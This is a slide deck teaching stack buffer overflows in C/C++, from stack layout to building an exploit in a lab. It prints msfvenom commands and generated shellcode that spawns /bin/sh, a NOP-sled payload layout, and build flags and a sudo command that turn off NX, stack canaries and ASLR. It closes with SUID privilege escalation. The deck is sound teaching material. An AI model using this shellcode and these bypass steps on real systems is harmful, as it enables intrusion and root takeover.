# Buffer overflow attack

<small>© 2026 wrazik</small>

---

## Introduction

A buffer overflow happens when a program tries to fill a block with memory (a memory buffer) with more data than the buffer was supposed to hold. 
By sending suitably crafted user inputs to a vulnerable application, attackers can force the application to execute arbitrary code to take control 
of the machine or crash the system.

---

## Examples
```cpp
char buf[256];
std::strcpy(buf, argv[1]);
strcat(buf, argv[1]);
gets(buf);
```
```cpp
char buf[10];
scanf("%s", buf);
```
```cpp
char buf[16];
sprintf(buf, "User ID: %d %d %d", 1, 2, 3);
```
```cpp
char src[32] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
char dst[8];

memcpy(dst, src, sizeof(src));
```
---
## Function stack frame
<div class="container">
<div class="col">

```cpp
int sum(int a, int b) {
	int temp = 0;
    temp = a + b;
    return temp;
}

int main() {
    int a = 10;
    int b = 20;
    int ret = sum(a, b);
    std::println("result: {}", ret);
    return 0;
}
```
</div>

<div class="col">
<div>

What exactly happened when the program is running? 

After `main()` called `sum()`, how does the program know which function to return back to?

After `sum()` returns to `main()`, how does the program know which line to continue?

</div>
</div>

---
## Memory

![Memory layout](./img/memory.png)  <!-- .element height="600px" -->

---
### Before we move on - let's talk about RAM!

<div class="container">
<div class="col">

Static RAM (SRAM)

![SRAM](./img/sram.png)  <!-- .element height="300px" -->

- one cell = 6 transistors
- requires constant power
- almost immediatly read
- stable state, no refresh needed


</div>
<div class="col">

Dynamic RAM (DRAM)

![SRAM](./img/dram.png)  <!-- .element height="300px" -->

- one cell - transistor and capacitor
- use capacitor means that reading cell discharge it
- capacitor must be recharged
- refresh rate is roughly 64ms

</div>
</div>

---
## Cache 

<div class="container">
<div class="col">

![Cpu memory](./img/cpu_memory.png)  <!-- .element height="500px" -->


</div>
<div class="col">

Writing speeds (in cycles:
- CPU Registers: <= 1 
- L1d: ~3
- L2: ~14
- Main Memory: ~240

</div>
</div>

---
## CPU Registers (x86)

<div class="container">
<div class="col">

![Cpu registers](./img/registers.png)  <!-- .element height="500px" -->


</div>
<div class="col">

- EAX: `Accumulator` - used by multiplication and division instructions, also return values come back in EAX
- EDX: `Data Register` - used with `EAX` in multiplication/division
- ECX: `Counter` - loop counter, shift/rotate instructions
- ESP: `Stack pointer`, used to point to the top of the stack in memory, automatically modified by `push`, `pop`, `call`, `ret`


</div>
</div>

---
## CPU Registers (x86)

<div class="container">
<div class="col">

![Cpu registers](./img/registers.png)  <!-- .element height="500px" -->


</div>
<div class="col">

- EIP: `Instruction pointer` - holds address next instruction to execute
- EBP: `Base Pointer` - used to reference stack frame
- EFLAGS: Stores status flags after operations, eg ZF (result zero), OF (signed arithmetic overflow)
- ESI, EDI: `Source` and `Destination` index, string/memory operations
- EBX: `Base register`, general purpose, ofter used to hold base address data


</div>
</div>

---
## Program execution flow
Before a program can run, it must be loaded into memory by a utility known as a program
loader. After loading, the operating system must point the CPU to the program’s entry point,
which is the address at which the program is to begin execution

- OS searches filename in the current directory / PATHs
- If found - OS retrieves basic information (file size, physical location on disk drive)
- OS determines next availaible location in memory and  enters information about the program's size and location into a table (descriptor table)
- Begin execution with first machine instruction (entry point). As the program begins running, it is called a process.
- Process runs by itself, OS track the execution

---
### Function stack
<div class="container">
<div class="col">

```cpp
int foobar(int a, int b, int c)
{
    int xx = a + 2;
    int yy = b + 3;
    int zz = c + 4;
    int sum = xx + yy + zz;

    return xx * yy * zz + sum;
}

int main()
{
    return foobar(77, 88, 99);
}
```

</div>

<div class="col">

![Function frame stack](./img/function_stack.png)  <!-- .element height="700px" -->

</div>
</div>

---
### Overflowing the stack
<div class="container">
<div class="col">

```cpp
int foobar(int a, int b, int c)
{
    int xx = a + 2;
    int yy = b + 3;
    int zz = c + 4;
    char sum[3]; 
    //... copying too much data to sum
}
```

</div>

<div class="col">

![Function frame stack](./img/stack_overflow.png)  <!-- .element height="700px" -->

</div>
</div>

---
## Problems

1. How to find how big the payload should be?
1. How to get malicious payload?
1. What if memory layout will be slightly different?
1. How to get address of malicious code? 

![Function frame stack](./img/payload_layout1.png)  <!-- .element height="500px" -->

---
## Calculating payload size
 

`GDB SESSION`

---
## How to get malicious payload?


```bash
➜ msfvenom -p linux/x64/exec CMD="/bin/sh" -f c               
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 44 bytes
Final size of c file: 212 bytes
unsigned char buf[] = 
"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f"
"\x52\x66\x68\x2d\x63\x54\x5e\x52\xe8\x08\x00\x00\x00\x2f"
"\x62\x69\x6e\x2f\x73\x68\x00\x56\x57\x54\x5e\x6a\x3b\x58"
"\x0f\x05";
```

But.... in our code, there is strcpy and payload containx \x00. What now?
---
## Payload NULL problem

```bash
"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f"
--------------------------------------^^^----------------
...
```

We can use mfvenom encoder that will modify payload not to use null chars.
```bash
msfvenom --list encoders | grep x64

    x64/xor                       normal     XOR Encoder
    x64/xor_context               normal     Hostname-based Context Keyed Payload Encoder
    x64/xor_dynamic               normal     Dynamic key XOR Encoder
    x64/zutto_dekiru              manual     Zutto Dekiru
```
---
## Let's try x64/xor encoder:
```bash
msfvenom -p linux/x64/exec CMD="/bin/sh" -e x64/xor -b '\x00' -f c               

Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 87 (iteration=0)
x64/xor chosen with final size 87
Payload size: 87 bytes
Final size of c file: 393 bytes
unsigned char buf[] = 
"\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48\x8d\x05\xef"
"\xff\xff\xff\x48\xbb\xee\xd9\x69\xb6\x68\x0e\x9d\x8c\x48"
"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xa6\x61\x46"
"\xd4\x01\x60\xb2\xff\x86\xd9\xf0\xe6\x3c\x51\xcf\xea\x86"
"\xf4\x0a\xe2\x36\x5c\x75\x84\xee\xd9\x69\x99\x0a\x67\xf3"
"\xa3\x9d\xb1\x69\xe0\x3f\x5a\xc3\xe6\xd5\x81\x66\xb3\x68"
"\x0e\x9d\x8c";
```
`LIVE: VERIFYING .ELF FILE`
---
## 0x0a -> newline character

Our payload contains also 0x0a. Passing this as a parameter:
```bash
./44_buffer_overflow $(python3 -c 'import sys;sys.stdout.buffer.write(b"\x90\x0a\x0a\x90" + b"\x90")')
```
will split argv into multiple peaces. 
Instead of inline-script, we will use binary blob as an input to our program


---

## What if memory layout will be slightly different?

![Function frame stack](./img/payload_layout2.png)  <!-- .element height="500px" -->

No-op is 90 in machine code

---
## Our buffer

- few \x90
- malicious code 
- a little bit padding data
- return address, that points somewhere in the middle of payload - little endian!

---
## ...but...

---

## NX

There is a way to prevent executing code from the stack. Modern CPUs implement the NX (No-eXecute) bit.
- The NX bit allows the operating system to mark memory pages as non-executable.
- If the CPU attempts to execute instructions from such a page (e.g., stack or heap), it raises a segmentation fault / access violation.
- This prevents classic stack-based buffer overflow attacks that inject and execute shellcode
To verify, if code can be called, it is possible to inspect it in gdb:

```bash
mmap
[ Legend:  Code | Stack | Heap ]
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/wrazik/src/trainings/daily/44-buffer-overflow/src/cmake-build-debug/44_buffer_overflow
// ....
0x00007ffffffdd000 0x00007ffffffff000 0x0000000000000000 rwx [stack]
```

---
## NX 
To not mark page as Non-executable, we can set it in CMakeLists.txt:

```cmake
target_compile_options(44_buffer_overflow PRIVATE
        ...
        -fno-stack-protector
)

target_link_options(44_buffer_overflow PRIVATE
        -z execstack
        -no-pie
)
```

---
## Address randomization (ASLR)

```bash
➜  ./44_buffer_overflow Hello
0x7ffd6108fff0
➜  ./44_buffer_overflow Hello
0x7ffe7a76ed30
➜  ./44_buffer_overflow Hello
0x7ffd74b0d890
```

- Randomizes the memory addresses used by a program each time it is executed.
- Changes the locations of key memory regions such as the stack, heap, shared libraries, and sometimes the executable code.
- Introduces unpredictability in the process address space, so memory addresses are different on each run.
- Prevents attackers from reliably predicting where specific code or data resides in memory.
---

## Disabling ASLR

To disable ASLR, you need to call 

```bash
➜ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

After that, address of the local variable will be always the same

```bash
➜ ./44_buffer_overflow Hello
0x7fffffffd5e0
➜ ./44_buffer_overflow Hello
0x7fffffffd5e0
```

---
## Privilege escalation

Let's assume we have a binary with following permissions:
```bash
-rwsr-xr-x. 1 root   root   636K 03-06 07:04 44_buffer_overflow
```

- Root is the owner
- SUID set (the program runs with the permissions of the file owner instead of the user who runs it.)

### There is ANOTHER problem. 
---
## RUID, EUID, SUID

- ruid (real uid)- user who started the process
- euid (effective uid) - who I am allowed to act as right now
- suid (saved uid) - backup copy of euid 

```bash
execve("/bin/sh", argv, envp)
```
- The new shell process inherits the same real UID and effective UID from the parent.
- initially: ruid = my_user, euid = 0 (root)
- if shell detects euid != ruid, it drops privileges by setting euid = ruid

To fix - we need to add to our payload 
---
## Summary
What we need to prepare attack:
- Known address
- Compile code without NX flag
- Disable ASLR
- We didn't talk about stack canaries, CFI, Shadow stack....
---
## Modern attacks
Real attacks today are usually:
-  info leak -> ROP chain -> arbitrary read/write → code execution
-  or heap exploitation (use-after-free, type confusion)
-  or kernel exploitation (most privilege escalation vectors)
---
## Thank you! 
